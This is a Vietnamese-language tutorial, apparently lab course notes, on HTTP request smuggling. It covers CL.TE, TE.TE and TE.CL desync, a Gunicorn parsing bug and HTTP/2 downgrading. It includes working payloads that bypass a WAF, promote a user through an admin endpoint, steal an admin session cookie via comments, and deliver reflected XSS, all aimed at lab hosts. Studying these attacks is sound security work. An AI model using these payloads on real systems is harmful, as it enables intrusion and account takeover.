HTTP Request Smuggling, còn được gọi là **Desync Attacks**, là một kỹ thuật tấn công nâng cao khai thác sự khác biệt trong việc phân tích các yêu cầu HTTP giữa **frontend** (thường là reverse proxy, web cache, hoặc WAF) và **backend** (thường là web server). Kỹ thuật này yêu cầu hiểu rõ về giao thức TCP và HTTP để nhận diện được vấn đề xảy ra.

#### Dòng TCP chứa các yêu cầu HTTP

**TCP (Transmission Control Protocol)** là giao thức tầng vận chuyển cung cấp truyền thông tin đáng tin cậy và theo thứ tự. Giao thức TCP là **stream-oriented**, tức là dữ liệu được truyền dưới dạng luồng mà không có dấu phân cách rõ ràng giữa các yêu cầu HTTP.

Từ HTTP/1.1, các yêu cầu HTTP không còn được gửi qua từng kết nối TCP riêng lẻ mà sử dụng chung một kết nối TCP, điều này giúp cải thiện hiệu suất. Trong các trường hợp có reverse proxy, kết nối TCP thường được giữ mở và tái sử dụng cho nhiều yêu cầu:

```plaintext
POST / HTTP/1.1
Host: clte.htb
Content-Length: 5

HELLO
GET / HTTP/1.1
Host: clte.htb
```

Ở ví dụ trên, yêu cầu **POST** có phần thân là `HELLO` và yêu cầu **GET** bắt đầu ngay sau đó mà không có dấu phân cách rõ ràng. Vì thế, cả reverse proxy và web server đều cần xác định đúng điểm kết thúc yêu cầu trước và bắt đầu yêu cầu tiếp theo.

### Content-Length vs Transfer-Encoding

Có hai header HTTP chính được sử dụng để xác định độ dài phần thân yêu cầu HTTP:

1. **Content-Length (CL)**: Xác định rõ ràng độ dài (tính bằng byte) của phần thân yêu cầu.
2. **Transfer-Encoding (TE)**: Sử dụng phương pháp mã hóa `chunked`, chia phần thân thành các đoạn nhỏ với kích thước xác định.

#### Ví dụ sử dụng `Content-Length`:

```http
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

param1=HelloWorld&param2=Test
```

Ở đây, header `Content-Length` chỉ ra phần thân có độ dài 29 byte.

#### Ví dụ sử dụng `Transfer-Encoding: chunked`:

```http
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

1d
param1=HelloWorld&param2=Test
0
```

Trong trường hợp này, header `Transfer-Encoding` chỉ ra mã hóa `chunked`. Phần thân được chia thành các đoạn (chunks), kích thước của mỗi đoạn được biểu diễn dưới dạng số hệ thập lục phân. Đoạn cuối cùng có kích thước là `0` để báo hiệu kết thúc.

#### Xung đột giữa `Content-Length` và `Transfer-Encoding`

Theo chuẩn HTTP/1.1, nếu một yêu cầu chứa cả hai header `Content-Length` và `Transfer-Encoding`, header `Transfer-Encoding` sẽ được ưu tiên và `Content-Length` sẽ bị bỏ qua.

### Desynchronization (Tình trạng không đồng bộ)

Tấn công HTTP Request Smuggling khai thác sự khác biệt giữa reverse proxy và web server trong việc phân tích yêu cầu HTTP, gây ra **desynchronization**. Điều này có thể do lỗi phần mềm, không hỗ trợ mã hóa `chunked`, hoặc phân tích sai các header `Content-Length` và `Transfer-Encoding`.

Khi reverse proxy và web server không đồng ý về ranh giới yêu cầu HTTP, dữ liệu có thể bị hiểu sai giữa các hệ thống, dẫn đến các lỗi bảo mật nghiêm trọng. Một kẻ tấn công có thể tạo ra một yêu cầu được thiết kế đặc biệt để gây ra tình trạng không đồng bộ, từ đó có thể kiểm soát các yêu cầu tiếp theo của người dùng khác:

- **Mass exploitation**: Tấn công hàng loạt, bao gồm các kiểu tấn công XSS, đánh cắp dữ liệu người dùng.
- **WAF bypasses**: Bỏ qua các kiểm tra bảo mật của WAF.

---
# 9. Khai thác lỗ hổng HTTP Request Smuggling - CL.TE Vulnerability

#### **1. Khái niệm về CL.TE Vulnerability**

Trong lỗ hổng HTTP Request Smuggling kiểu `CL.TE`, máy chủ proxy ngược (reverse proxy) không hỗ trợ mã hóa dạng chunked (`Transfer-Encoding: chunked`). Khi một yêu cầu chứa cả hai header là `Content-Length` (CL) và `Transfer-Encoding` (TE), proxy sẽ sử dụng header `Content-Length` để xác định độ dài của request, trong khi máy chủ web sẽ dựa vào header `Transfer-Encoding`. Điều này dẫn đến sự không đồng bộ trong việc xử lý request, tạo ra lỗ hổng `CL.TE`.

#### **2. Phân tích yêu cầu HTTP**

Xét yêu cầu HTTP sau:

```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

**Từ góc nhìn của reverse proxy:**
- Reverse proxy không hỗ trợ chunked encoding, nên sử dụng `Content-Length: 10` để xác định độ dài của phần body.
- Phần body sẽ được đọc là: `0\r\n\r\nHELLO`, tức là toàn bộ request được xử lý mà không còn dữ liệu dư thừa.

**Từ góc nhìn của web server:**
- Web server hỗ trợ chunked encoding và sẽ sử dụng header `Transfer-Encoding` để xử lý.
- Phần body sẽ được xác định bởi chunked encoding, kết thúc khi gặp `0\r\n\r\n`.
- Phần dữ liệu còn lại (`HELLO`) sẽ được coi là một phần của yêu cầu tiếp theo.

Kết quả: Reverse proxy và web server không đồng bộ về ranh giới của request.

#### **3. Tạo ra desynchronization**

Nếu một yêu cầu mới đến ngay sau request đầu tiên, ví dụ:

```http
GET / HTTP/1.1
Host: clte.htb
```

**Từ góc nhìn của reverse proxy:**
- Proxy xác định hai request như sau:
  ```http
  POST / HTTP/1.1
  Host: clte.htb
  Content-Length: 10
  Transfer-Encoding: chunked

  0
  HELLO
  GET / HTTP/1.1
  Host: clte.htb
  ```

**Từ góc nhìn của web server:**
- Web server thấy phần dữ liệu còn lại là `HELLOGET / HTTP/1.1`, biến request thành:
  ```http
  HELLOGET / HTTP/1.1
  Host: clte.htb
  ```

Kết quả: Một HTTP method không hợp lệ (`HELLOGET`), dẫn đến lỗi `HTTP 405 - Method not allowed`.

#### **4. Khai thác lỗ hổng**

Giả sử chúng ta muốn ép buộc admin thực hiện một hành động trái phép, ví dụ: nâng cấp quyền của người dùng qua endpoint `/admin.php?promote_uid=2`. Ta có thể gửi yêu cầu như sau:

```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy:
```

**Giải thích:**
- Proxy sẽ sử dụng `Content-Length: 52` để đọc toàn bộ request.
- Tuy nhiên, web server sẽ sử dụng chunked encoding và kết thúc request sau `0\r\n\r\n`.
- Yêu cầu tiếp theo sẽ là:
  ```http
  POST /admin.php?promote_uid=2 HTTP/1.1
  Dummy: GET / HTTP/1.1
  Host: clte.htb
  Cookie: sess=<admin_session_cookie>
  ```

**Kết quả:**
- Web server thấy yêu cầu thứ hai là một POST request tới `/admin.php?promote_uid=2`, sử dụng session cookie của admin.
- Điều này dẫn đến việc tài khoản của chúng ta được nâng cấp quyền mà không cần sự cho phép của admin.

#### **5. Xác nhận lỗ hổng và khai thác**

- Để kiểm tra lỗ hổng, bạn có thể gửi các request trên qua Burp Repeater. Quan sát phản hồi HTTP `405 Method Not Allowed` cho thấy rằng có sự desynchronization.
- Sau khi xác nhận lỗ hổng, gửi request khai thác và đợi admin truy cập vào trang, bạn sẽ thấy rằng tài khoản đã được nâng cấp quyền.

---
# 10. Khai thác lỗ hổng HTTP Request Smuggling - TE.TE Vulnerability
Trong ví dụ về HTTP request smuggling này, ta sẽ xem xét một tình huống trong đó cả reverse proxy và web server đều hỗ trợ encoding theo chunked. Tuy nhiên, một trong hai hệ thống không tuân theo đúng tiêu chuẩn, dẫn đến việc có thể thao túng header TE (Transfer-Encoding) sao cho một trong hai hệ thống chấp nhận nó, trong khi hệ thống còn lại lại bỏ qua và thay vào đó sử dụng header CL (Content-Length). Lỗ hổng này được gọi là lỗ hổng **TE.TE**. Dưới đây là các bước để nhận diện và khai thác lỗ hổng này.

### **Nhận diện Lỗ Hổng TE.TE**

Để nhận diện lỗ hổng TE.TE, mục tiêu là khiến cho một trong hai hệ thống (reverse proxy hoặc web server) bỏ qua header **TE**. Ta có thể làm điều này bằng cách thay đổi một chút cú pháp trong header **Transfer-Encoding** để kiểm tra xem hệ thống có tuân theo tiêu chuẩn hay không. Một số hệ thống chỉ kiểm tra sự xuất hiện của từ khóa "chunked" trong header, trong khi một số hệ thống khác yêu cầu phải so khớp chính xác. Do đó, ta có thể thay đổi header **Transfer-Encoding** thành "testchunked" để làm cho một hệ thống bỏ qua TE và sử dụng header **Content-Length** thay thế.

Dưới đây là một số cách để che khuất header **Transfer-Encoding** sao cho hệ thống không phân tích đúng, dẫn đến việc một trong hai hệ thống không đọc đúng header này:

### **Các Phương Pháp Che Khuất Header TE**
| Mô tả             | Ví dụ Header                                               |
|-------------------|------------------------------------------------------------|
| **So khớp con**    | `Transfer-Encoding: testchunked`                           |
| **Khoảng trắng trong tên header** | `Transfer-Encoding : chunked`                          |
| **Tab ngang**      | `Transfer-Encoding:[\x09]chunked`                          |
| **Tab dọc**        | `Transfer-Encoding:[\x0b]chunked`                          |

Lưu ý: Các ký tự `[\x09]` và `[\x0b]` không phải là chuỗi ký tự thực tế trong các phương pháp che khuất mà là ký tự ASCII tương ứng với tab ngang (0x09) và tab dọc (0x0b).

### **Khai Thác Lỗ Hổng TE.TE**

Khi một hệ thống không phân tích đúng header TE và bỏ qua nó, chúng ta có thể khai thác lỗ hổng tương tự như trong trường hợp **CL.TE** (Content-Length và Transfer-Encoding). Hệ thống sẽ dựa vào **Content-Length** để phân tích chiều dài của request, trong khi web server tiếp tục xử lý request với header **Transfer-Encoding**. Do đó, chúng ta có thể buộc hệ thống phản hồi không đúng cách, gây ra sự bất đồng về biên giới của các request trong một kết nối TCP.

Ví dụ, giả sử ta có một web application bị lỗi **TE.TE** như sau:

**Request ban đầu:**
```http
POST / HTTP/1.1
Host: tete.htb
Content-Length: 10
Transfer-Encoding: chunked
0
HELLO
```

Bây giờ, chúng ta thay thế khoảng trắng giữa header **Transfer-Encoding** và từ "chunked" bằng một ký tự tab ngang (0x09), gửi lại request. Hệ thống reverse proxy có thể bỏ qua header **Transfer-Encoding**, trong khi web server sẽ vẫn xử lý nó như một chunked encoding. Điều này dẫn đến một lỗi trong phân tích request, làm cho một phần của request tiếp theo được xử lý sai.

**Request che khuất TE header:**
```http
POST / HTTP/1.1
Host: tete.htb
Content-Length: 46
Transfer-Encoding: [\x09]chunked
0
chunked
GET /admin?reveal_flag=1 HTTP/1.1
```

Khi request này được gửi đi, hệ thống sẽ xử lý nó như một **CL.TE** vulnerability, dẫn đến việc web server chấp nhận **GET /admin?reveal_flag=1**, trong khi reverse proxy không nhận ra request này. Ta có thể yêu cầu admin tiết lộ flag cho ta bằng cách tận dụng sự bất đồng này.

---
# 11. Khai thác lỗ hổng HTTP Request Smuggling - TE.CL Vulnerability

#### 1. **Giới thiệu về lỗ hổng TE.CL**
Lỗ hổng TE.CL (Transfer-Encoding.Content-Length) xảy ra khi một reverse proxy sử dụng chunked encoding (chuyển mã theo phần) trong khi web server sử dụng header Content-Length (CL) để xác định độ dài yêu cầu. Trong trường hợp này, reverse proxy và web server có cách phân tích yêu cầu HTTP khác nhau, tạo ra sự không đồng nhất giữa chúng về vị trí kết thúc của dữ liệu yêu cầu. Điều này có thể bị lợi dụng để thực hiện các cuộc tấn công request smuggling, trong đó kẻ tấn công có thể "nhét" yêu cầu độc hại vào các yêu cầu hợp lệ.

#### 2. **Cách khai thác TE.CL**
Để khai thác lỗ hổng TE.CL, chúng ta cần tạo ra hai yêu cầu HTTP:
- Yêu cầu đầu tiên sẽ có chunked encoding và một header Content-Length nhỏ hơn so với dữ liệu thực sự được gửi.
- Yêu cầu thứ hai sẽ được gửi ngay sau yêu cầu đầu tiên, nhưng web server sẽ chỉ đọc phần đầu của yêu cầu, trong khi reverse proxy đã phân tích xong.

Ví dụ:
```http
POST / HTTP/1.1
Host: tecl.htb
Content-Length: 3
Transfer-Encoding: chunked
5
HELLO
0

GET / HTTP/1.1
Host: tecl.htb
```

##### Giải thích:
- Reverse proxy sẽ đọc và phân tích yêu cầu `POST` dưới dạng chunked encoding, nhận thấy rằng dữ liệu "HELLO" có độ dài 5 bytes, và kết thúc khi gặp chunk `0`.
- Tuy nhiên, web server lại chỉ đọc theo độ dài từ header `Content-Length: 3`, và do đó nó chỉ đọc "5" (3 byte đầu tiên), bỏ qua phần còn lại, khiến nó nghĩ rằng đây là một yêu cầu mới.

Kết quả là:
- Reverse proxy sẽ chuyển tiếp cả yêu cầu `POST` và `GET` cho web server.
- Web server chỉ xử lý yêu cầu đầu tiên một cách sai lầm và tiếp nhận yêu cầu thứ hai như thể nó là một yêu cầu độc lập.

#### 3. **Thực hành với Burp Suite**
- **Cấu hình Burp Suite**:
  - Chỉnh sửa cài đặt trong Burp Repeater để Burp không tự động cập nhật header `Content-Length` mỗi khi yêu cầu được gửi đi.
  - Tạo một nhóm tab để gửi các yêu cầu trong một kết nối duy nhất.
  
- **Khai thác**:
  - Gửi các yêu cầu đầu tiên và thứ hai theo chuỗi và quan sát sự khác biệt trong cách reverse proxy và web server xử lý chúng.

#### 4. **Mô phỏng tấn công TE.CL với WAF**
Giả sử có một Web Application Firewall (WAF) chặn tất cả các yêu cầu chứa từ khóa "admin" trong URL. Kẻ tấn công có thể gửi hai yêu cầu:
```http
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: chunked
27

GET /admin HTTP/1.1
Host: tecl.htb
0
```

##### Giải thích:
- **Yêu cầu đầu tiên** sẽ nhận phản hồi 404 (không tìm thấy).
- **Yêu cầu thứ hai** sẽ được xử lý bởi web server như thể nó là một yêu cầu độc lập, và do đó không bị chặn bởi WAF.

Kết quả là:
- WAF không chặn yêu cầu thứ hai vì nó không chứa "admin" trong URL, mặc dù thực tế yêu cầu thứ hai thực sự có thể truy cập được trang admin.
- Web server xử lý yêu cầu thứ hai (GET /admin) và trả về trang quản trị mà không bị WAF chặn.

#### 5. **Tóm tắt về TE.CL Request Smuggling**
- **TE.CL** xảy ra khi reverse proxy và web server phân tích dữ liệu yêu cầu theo cách khác nhau (chunked encoding và Content-Length).
- Kỹ thuật này có thể bị khai thác để vượt qua các biện pháp bảo mật như WAF, giúp kẻ tấn công truy cập vào các tài nguyên bị hạn chế hoặc tiêm mã độc vào yêu cầu hợp lệ.
- Việc khai thác yêu cầu các công cụ như Burp Suite và sự hiểu biết về cách web server và reverse proxy xử lý HTTP.

#### 6. **Ví dụ**
Giả sử bạn gửi một yêu cầu sau:

```http
POST / HTTP/1.1
Host: tecl.htb
Content-Length: 3
Transfer-Encoding: chunked
5
HELLO
0

GET / HTTP/1.1
Host: tecl.htb
```

- **Reverse Proxy** sẽ đọc "HELLO" từ chunked encoding, nhưng web server sẽ chỉ đọc 3 byte từ header `Content-Length` (chỉ có "5"), làm cho nó nghĩ rằng yêu cầu chưa hoàn tất và bắt đầu xử lý yêu cầu thứ hai (`GET /`).

- Điều này có thể dẫn đến việc web server trả về dữ liệu không mong muốn, chẳng hạn như truy cập vào trang admin mà không qua được WAF.

---
# 12. Giới thiệu về Lỗ hổng "Vulnerable Software"

Lỗ hổng **request smuggling** không chỉ xảy ra do lỗi phân tích hoặc thiếu hỗ trợ cho header **TE**, mà còn có thể do các lỗi khác gây ra, dẫn đến việc độ dài của một yêu cầu (request) bị phân tích sai. Điều này có thể xảy ra khi các web server hoặc reverse proxy xử lý yêu cầu không chính xác, từ đó tạo ra các lỗ hổng có thể khai thác.

**Ví dụ về lỗi trong Gunicorn:**

Trong phiên bản **Gunicorn 20.0.4**, có một lỗi khi gặp phải header **Sec-Websocket-Key1** (dùng trong kết nối WebSocket), khiến web server cố định độ dài của yêu cầu HTTP thành 8 byte, bất kể giá trị của các header **Content-Length** và **Transfer-Encoding**. Đây là một điểm yếu quan trọng, vì reverse proxy không gặp phải lỗi này, cho phép ta tạo ra sự không đồng nhất giữa các hệ thống.

---

### 2. **Xác định Lỗ hổng (Identification)**

**Tạo Yêu cầu (Request) trong Burp Suite:**

Để kiểm tra lỗ hổng này, chúng ta sẽ tạo một **tab group** trong Burp Repeater với hai yêu cầu (requests) như sau:

#### Yêu cầu 1:

```
GET / HTTP/1.1
Host: gunicorn.htb
Content-Length: 49
Sec-Websocket-Key1: x
xxxxxxxx
```

#### Yêu cầu 2:

```
GET /404 HTTP/1.1
Host: gunicorn.htb
```

Sau khi gửi các yêu cầu này qua một **TCP connection duy nhất**, ta sẽ thấy hành vi sau:

- Phản hồi của yêu cầu đầu tiên là trang chính của website như mong đợi.
- Phản hồi của yêu cầu thứ hai trả về **404 status code** mặc dù URL là `/404`.

**Phân tích TCP Stream:**

- **Từ góc nhìn của Reverse Proxy:**
  - Reverse proxy phân tích yêu cầu theo cách dự đoán, với yêu cầu đầu tiên có body dài 49 byte.
  - Yêu cầu thứ hai `/404` có body rỗng.

- **Từ góc nhìn của Web Server (Gunicorn):**
  - Gunicorn, do lỗi trong cách xử lý header **Sec-Websocket-Key1**, giả định độ dài body là 8 byte, mặc dù **Content-Length** được chỉ định là 49 byte.
  - Do đó, sau khi xử lý yêu cầu đầu tiên, Gunicorn thấy yêu cầu thứ hai (`/404`), và sau đó lại tiếp tục xử lý yêu cầu thứ ba (`/`), mà không có độ dài body chính xác. Điều này tạo ra sự bất đồng giữa reverse proxy và web server, từ đó dẫn đến các phản hồi không mong muốn.

---

### 3. **Khai thác Lỗ hổng (Exploitation)**

Mục tiêu trong phần khai thác này là **vượt qua WAF (Web Application Firewall)**, vốn từ chối tất cả yêu cầu chứa **"admin"** trong query string. Tuy nhiên, bằng cách **"ẩn"** yêu cầu truy cập vào trang admin trong yêu cầu đầu tiên, chúng ta có thể làm cho WAF không bao giờ phân tích được chuỗi truy vấn này.

**Quá trình khai thác:**

- **Yêu cầu đầu tiên**: Sử dụng phương pháp **request smuggling**, ta gửi yêu cầu đến `/` với **header Sec-Websocket-Key1**, làm Gunicorn giả định độ dài body là 8 byte.
  
- **Yêu cầu thứ hai**: Ta gửi yêu cầu tới trang `/admin` mà WAF không thể nhận diện, vì yêu cầu này không được phân tích đúng khi tới WAF.

**Hành vi khi gửi qua Burp Repeater**:

- Phản hồi từ yêu cầu `/404` trả về **404**.
- Tuy nhiên, **phản hồi của yêu cầu `/admin`** là **200 OK**, và ta có thể truy cập được trang admin.

**Phân tích TCP Stream trong quá trình khai thác**:

- **Từ góc nhìn của WAF**:
  - WAF sẽ chỉ nhìn thấy yêu cầu `/404` và không thấy yêu cầu `/admin` vì chúng bị "ẩn" trong body của yêu cầu đầu tiên.
  
- **Từ góc nhìn của Web Server**:
  - Web server tiếp tục xử lý yêu cầu `/admin` như một yêu cầu riêng biệt và trả về phản hồi hợp lệ, cho phép ta truy cập vào trang admin mà không bị chặn bởi WAF.

---
# 13. Khai thác Lỗ hổng Request Smuggling

Lỗ hổng **HTTP request smuggling** cho phép kẻ tấn công thực hiện nhiều kỹ thuật mạnh mẽ để vượt qua các cơ chế bảo mật, thao túng hành động của người dùng, đánh cắp dữ liệu và khai thác các lỗ hổng khác như XSS phản chiếu. Dưới đây là các phương thức khai thác khác nhau và các tình huống thực tế mà yêu cầu smuggling có thể được tận dụng.

#### 1. **Vượt qua Kiểm Tra Bảo Mật (WAFs)**
**Web Application Firewalls (WAFs)** thường được sử dụng để chặn các yêu cầu độc hại dựa trên các tham số của chúng, chẳng hạn như các từ khóa bị liệt vào danh sách đen hoặc các hành vi HTTP bất thường. Tuy nhiên, **HTTP request smuggling** có thể vượt qua các cơ chế bảo mật này bằng cách tạo ra sự khác biệt trong cách mà **reverse proxy** và **web server** xử lý các yêu cầu HTTP.

- **Ví dụ Tình huống:** Giả sử WAF chặn tất cả các yêu cầu đến đường dẫn `/internal/` trừ khi yêu cầu đó đến từ địa chỉ IP trong mạng nội bộ. Với một cuộc tấn công CL.TE (Content-Length theo sau là Transfer-Encoding) hoặc TE.CL (Transfer-Encoding theo sau là Content-Length), kẻ tấn công có thể gửi một yêu cầu smuggled trong thân của một yêu cầu hợp lệ, giúp vượt qua WAF mà không bị phát hiện.
  
  **Payload cho lỗ hổng CL.TE:**
  ```
  POST / HTTP/1.1
  Host: vuln.htb
  Content-Length: 64
  Transfer-Encoding: chunked
  0

  POST /internal/index.php HTTP/1.1
  Host: localhost
  Dummy:
  ```

  **Payload cho lỗ hổng TE.CL:**
  ```
  GET / HTTP/1.1
  Host: vuln.htb
  Content-Length: 4
  Transfer-Encoding: chunked
  35

  GET /internal/index.php HTTP/1.1
  Host: localhost
  0
  ```

WAF chỉ xử lý yêu cầu GET đầu tiên và không xem xét yêu cầu smuggled, giúp kẻ tấn công truy cập vào các đường dẫn bị hạn chế.

#### 2. **Đánh Cắp Dữ Liệu Người Dùng**
Kẻ tấn công có thể lợi dụng các lỗ hổng request smuggling để thao túng các yêu cầu và đánh cắp dữ liệu nhạy cảm của người dùng. Ví dụ, kẻ tấn công có thể ép người dùng đã xác thực (như admin) gửi yêu cầu với các tham số nhạy cảm (chẳng hạn như cookie phiên làm việc hoặc dữ liệu cá nhân) đến một địa chỉ mà kẻ tấn công có thể truy cập sau.

- **Ví dụ Tình huống:** Kẻ tấn công có thể thao túng một yêu cầu POST để gửi một bình luận, smuggle cookie phiên của admin vào thân yêu cầu. Kẻ tấn công sau đó có thể truy cập cookie phiên của admin và chiếm quyền truy cập.

  **Yêu cầu POST smuggled:**
  ```
  POST / HTTP/1.1
  Host: stealingdata.htb
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 154
  Transfer-Encoding: chunked
  0

  POST /comments.php HTTP/1.1
  Host: stealingdata.htb
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 300
  name=hacker&comment=test
  GET / HTTP/1.1
  Host: stealingdata.htb
  Cookie: sess=<admin_session_cookie>
  ```

Trong trường hợp này, kẻ tấn công smuggle một yêu cầu chứa cookie phiên của admin vào bình luận, và bình luận này sẽ xuất hiện công khai khi được gửi.

#### 3. **Khai Thác XSS Phản Chiếu Rộng Rãi**
Request smuggling cũng có thể được sử dụng để khai thác lỗ hổng **XSS phản chiếu** theo cách có thể mở rộng hơn. Điều này rất hữu ích trong các tình huống mà một lỗ hổng XSS phản chiếu tồn tại nhưng không thể khai thác vì kẻ tấn công không thể thao túng yêu cầu trình duyệt của nạn nhân trực tiếp. Với **request smuggling**, kẻ tấn công có thể thao túng các header HTTP của yêu cầu nạn nhân để chèn mã độc vào.

- **Ví dụ Tình huống:** Giả sử một ứng dụng web có lỗ hổng XSS phản chiếu qua một header HTTP tùy chỉnh, chẳng hạn như `Vuln`. Kẻ tấn công có thể sử dụng một kỹ thuật request smuggling để chèn một payload độc hại vào header này sao cho khi yêu cầu của nạn nhân đến server, nó sẽ chứa mã độc, dẫn đến việc khai thác XSS.

  **Khai thác lỗ hổng XSS bằng CL.TE:**
  ```
  POST / HTTP/1.1
  Host: vuln.htb
  Content-Length: 63
  Transfer-Encoding: chunked
  0
  
  GET / HTTP/1.1
  Vuln: "><script>alert(1)</script>
  Dummy:
  ```

Khi nạn nhân thực hiện yêu cầu của họ, payload trong header `Vuln` sẽ được phản chiếu trong phản hồi của server, dẫn đến việc thực thi mã XSS.

---
# 14. Các Công Cụ và Biện Pháp Phòng Ngừa HTTP Request Smuggling

#### Công Cụ Hỗ Trợ Khám Phá và Khai Thác Lỗ Hổng HTTP Request Smuggling

Một công cụ hữu ích để xác định và khai thác các lỗ hổng **HTTP request smuggling** là **Burp Extension: HTTP Request Smuggler**. Bạn có thể cài đặt công cụ này từ **Burp Extensions Store** trong tab Extensions bằng cách vào **BApp Store** và tìm kiếm cài đặt mở rộng này.

**Các tính năng của công cụ HTTP Request Smuggler:**

1. **Chuyển đổi yêu cầu sang mã hóa chunked:** Công cụ này có thể giúp chúng ta chuyển đổi các yêu cầu POST thông thường sang định dạng chunked encoding. Định dạng này yêu cầu chúng ta phải chuyển đổi độ dài của mỗi chunk từ hệ thập phân sang hệ thập lục phân, và công cụ sẽ thực hiện việc này tự động.

    - Ví dụ: Một yêu cầu POST như sau:
      ```
      POST / HTTP/1.1
      Host: clte.htb
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 17
      param1=HelloWorld
      ```

      Sau khi sử dụng chức năng **Convert to chunked** từ menu của Burp, yêu cầu sẽ được chuyển thành:
      ```
      POST / HTTP/1.1
      Host: clte.htb
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 28
      Transfer-Encoding: chunked
      11
      param1=HelloWorld
      0
      ```

2. **Khai thác Lỗ Hổng CL.TE:** Nếu bạn đang làm việc với một ứng dụng dễ bị tấn công kiểu **CL.TE** (Content-Length/Transfer-Encoding), bạn có thể sử dụng công cụ này để khai thác lỗ hổng. Để thực hiện việc này, bạn chỉ cần nhấp chuột phải vào yêu cầu đã được chuyển sang định dạng chunked và chọn **Extensions > HTTP Request Smuggler > Smuggle attack (CL.TE)**. 

    - Điều này sẽ mở một cửa sổ **Turbo Intruder** nơi bạn có thể thay đổi các tham số và bắt đầu thử nghiệm khai thác. 
    - Ví dụ, bạn có thể thay đổi **prefix** trong script để thử tấn công vào đường dẫn `/admin.php`.

    Sau khi nhấn nút **Attack**, Turbo Intruder sẽ bắt đầu khai thác mục tiêu và gửi các yêu cầu thử nghiệm. Sau một vài giây, bạn có thể nhấn **Halt** để dừng cuộc tấn công và phân tích kết quả. Nếu lỗ hổng smuggling thành công, bạn sẽ thấy một phản hồi khác biệt, chẳng hạn như trả về trang `/admin.php` thay vì trang chủ, chứng tỏ tấn công đã thành công.

---
# 15. Giới Thiệu về HTTP/2

**HTTP/2** là phiên bản mới nhất của giao thức HTTP, được thiết kế để giảm độ trễ và cải thiện hiệu suất của lưu lượng HTTP. Ngoài việc cải thiện hiệu suất, phiên bản này cũng mang lại những cải tiến về bảo mật, đặc biệt là đối với vấn đề **request smuggling**. Tuy nhiên, như chúng ta sẽ thấy trong phần này, nếu HTTP/2 không được cấu hình đúng trong môi trường triển khai, các lỗ hổng request smuggling vẫn có thể xuất hiện.

#### HTTP/2 là gì?

**HTTP/2** được giới thiệu vào năm 2015 và thực hiện các cải tiến đối với lưu lượng HTTP, đồng thời vẫn giữ tính tương thích ngược với các phiên bản trước. Cụ thể, các phương thức HTTP, tiêu đề HTTP và đường dẫn truy vấn HTTP vẫn tồn tại, nhưng dữ liệu được định dạng khác trong quá trình truyền tải. Điều này có nghĩa là không có sự khác biệt rõ rệt về cách hiển thị yêu cầu và phản hồi HTTP trong các công cụ web proxy như **Burp Suite**, vì các yêu cầu và phản hồi HTTP/2 vẫn hiển thị theo cách mà chúng ta quen thuộc từ HTTP/1.1. Tuy nhiên, dữ liệu được định dạng khác trong quá trình truyền tải để cải thiện hiệu suất.

Trong khi HTTP/1.1 là một giao thức dựa trên chuỗi (string-based protocol), có nghĩa là các yêu cầu và phản hồi HTTP được gửi dưới dạng chuỗi mà chúng ta có thể đọc được, HTTP/2 lại là một giao thức nhị phân (binary protocol). Tương tự như TCP, dữ liệu không được gửi dưới dạng chuỗi mà dưới dạng dữ liệu nhị phân, điều này không thể đọc được bởi con người. 

Ngoài ra, HTTP/2 còn hỗ trợ **server push** – khả năng cho phép server gửi dữ liệu tới client mà không cần client yêu cầu trước. Điều này đặc biệt hữu ích cho các tài nguyên tĩnh như stylesheet, script files, và hình ảnh. Khi client yêu cầu trang chủ của một ứng dụng web, server biết rằng client cần các tài nguyên này ngay lập tức và sẽ "đẩy" chúng đến client thay vì phải đợi client tải từng tài nguyên riêng biệt như trong HTTP/1.1.

#### So Sánh Giữa HTTP/1.1 và HTTP/2

Cùng xem xét một ví dụ về yêu cầu HTTP/1.1 và HTTP/2. Giả sử yêu cầu HTTP/1.1 sau đây:

```
GET /index.php HTTP/1.1
Host: http2.htb
```

Trong HTTP/2, yêu cầu tương tự sẽ được biểu diễn bằng các **pseudo-headers** như sau:

```
:method GET
:path /index.php
:authority http2.htb
:scheme http
```

Các pseudo-headers này có ý nghĩa như sau:

- **:method**: Phương thức HTTP (GET, POST, v.v.)
- **:scheme**: Giao thức (thường là `http` hoặc `https`)
- **:authority**: Tương tự như tiêu đề **Host** trong HTTP/1.1
- **:path**: Đường dẫn yêu cầu bao gồm cả chuỗi truy vấn nếu có

Trong **Burp Suite**, yêu cầu HTTP/2 sẽ hiển thị các pseudo-headers này trong tab **Burp Inspector**, mặc dù Burp vẫn hiển thị chúng dưới dạng HTTP/1.1 để thuận tiện cho người sử dụng.

#### Cải Tiến Bảo Mật của HTTP/2

Một thay đổi quan trọng đối với bảo mật, đặc biệt là trong việc ngăn ngừa **request smuggling**, là **chunked encoding** không còn được hỗ trợ trong HTTP/2. Hơn nữa, vì HTTP/2 truyền tải thân yêu cầu dưới dạng nhị phân với các khung dữ liệu (data frames), không cần có trường **Content-Length** rõ ràng để xác định độ dài của thân yêu cầu. Các khung dữ liệu này đã bao gồm một trường độ dài tích hợp, giúp bất kỳ hệ thống nào cũng có thể tính toán được độ dài của thân yêu cầu.

Nhờ vào tính năng này, các cuộc tấn công **request smuggling** trở nên gần như không thể thực hiện nếu HTTP/2 được triển khai đúng cách. Vì vậy, HTTP/2 giúp cải thiện đáng kể bảo mật của các ứng dụng web, ngăn chặn các lỗ hổng mà HTTP/1.1 có thể gặp phải trong quá trình xử lý yêu cầu.

---
# 16. Hạ cấp HTTP/2

**HTTP/2 Downgrading** xảy ra khi client HTTP sử dụng HTTP/2 để giao tiếp với reverse proxy, nhưng reverse proxy và web server lại sử dụng HTTP/1.1 để giao tiếp với nhau. Trong tình huống này, reverse proxy cần phải chuyển đổi tất cả các yêu cầu HTTP/2 thành HTTP/1.1. Đồng thời, tất cả các phản hồi HTTP/1.1 từ web server cũng cần được chuyển đổi thành HTTP/2. Hành vi này có thể tạo ra các lỗ hổng **request smuggling**.

